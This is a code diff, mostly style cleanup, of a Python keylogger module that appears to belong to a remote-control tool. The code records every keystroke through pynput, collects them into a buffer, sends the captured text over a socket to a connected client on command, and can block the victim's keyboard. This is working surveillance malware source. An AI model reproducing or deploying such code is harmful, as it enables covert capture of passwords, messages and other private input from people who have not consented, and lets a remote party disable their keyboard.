@@ -1,8 +1,15 @@
 import threading
+
 import keyboard
-from pynput.keyboard import Listener 
+from pynput.keyboard import Listener
 
 BUFSIZ = 1024 * 4
+
+cont = " "  # content of keylogger
+flag = 0  # flag of keylogger
+ishook = 0  # flag of hook
+islock = 0  # flag of lock
+
 
 def keylogger(key):
     global cont, flag
@@ -10,25 +17,28 @@ def keylogger(key):
         return False
     if flag == 1:
         tmp = str(key)
-        if tmp == 'Key.space':
-            tmp = ' '
+        if tmp == "Key.space":
+            tmp = " "
         elif tmp == '"\'"':
             tmp = "'"
         else:
             tmp = tmp.replace("'", "")
         cont += tmp
     return
-        
+
+
 def _print(client):
     global cont
     client.sendall(bytes(cont, "utf8"))
     cont = " "
     return
-    
+
+
 def listen():
-    with Listener(on_press = keylogger) as listener:
-        listener.join()  
+    with Listener(on_press=keylogger) as listener:
+        listener.join()
     return
+
 
 def lock():
     global islock
@@ -41,12 +51,13 @@ def lock():
             keyboard.unblock_key(i)
         islock = 0
     return
-        
+
+
 def keylog(client):
     global cont, flag, islock, ishook
     islock = 0
     ishook = 0
-    threading.Thread(target = listen).start() 
+    threading.Thread(target=listen).start()
     flag = 0
     cont = " "
     msg = ""
@@ -65,5 +76,5 @@ def keylog(client):
             lock()
         elif "QUIT" in msg:
             flag = 4
-            return    
-    return   
+            return
+    return
